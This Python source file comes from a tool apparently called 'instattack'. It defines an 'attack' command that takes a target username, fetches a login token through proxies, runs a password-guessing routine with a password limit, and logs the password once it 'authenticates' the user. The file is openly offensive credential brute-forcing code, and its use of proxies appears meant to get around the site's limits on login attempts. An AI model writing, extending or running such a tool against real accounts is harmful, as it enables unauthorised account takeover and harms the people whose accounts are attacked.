import asyncio

from instattack.models import User

from .base import Instattack
from .args import RequestArgs, ProxyArgs, PasswordArgs, TokenArgs
from .stages import attack, get_token


@Instattack.subcommand('attack')
class InstattackAttack(Instattack, RequestArgs, ProxyArgs, PasswordArgs, TokenArgs):

    __name__ = 'Attack Command'

    def main(self, username):
        loop = asyncio.get_event_loop()

        self.user = User(username)
        self.user.setup()

        # Token will be None if an exception occured.
        token = loop.run_until_complete(self.retrieve_token(loop))
        if not token:
            self.log.error('Token retrieval failed.')
            return

        self.log.complete('Received Token', extra={'other': token})
        result = loop.run_until_complete(self.attempt_attack(loop, token))
        if result:
            self.log.info(f'Authenticated User!', extra={
                'password': result.context.password
            })

    async def retrieve_token(self, loop):

        request_config = self.request_config(method='GET')
        request_config['token_max_fetch_time'] = self._token_max_fetch_time
        proxy_config = self.proxy_config(method='GET')

        return await get_token(
            loop,
            request_config=request_config,
            proxy_config=proxy_config
        )

    async def attempt_attack(self, loop, token):

        return await attack(
            loop,
            token,
            self.user,
            request_config=self.request_config(method='POST'),
            proxy_config=self.proxy_config(method='POST'),
            pwlimit=self._pwlimit
        )
